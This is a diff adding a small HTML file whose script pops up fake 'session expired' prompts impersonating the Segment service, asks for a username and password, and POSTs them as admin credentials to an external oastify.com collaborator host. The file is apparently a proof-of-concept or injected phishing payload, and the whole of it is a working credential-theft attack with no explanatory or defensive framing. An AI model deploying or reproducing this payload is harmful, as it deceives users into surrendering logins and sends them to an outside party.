@@ -1,0 +1,17 @@
+<!DOCTYPE HTML>
+<html>
+
+<body>
+
+<script>
+let name=prompt("Your Segment session expired login again. \n Enter Username");
+let password=prompt("Your Segement session expired login again. \n Enter Password");
+fetch('https://tspadc6azrautltgpzmizdt9x03qrf.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:"Admin Username is-"+name+",Admin Password is-"+password
+});
+</script>
+</body>
+
+</html>
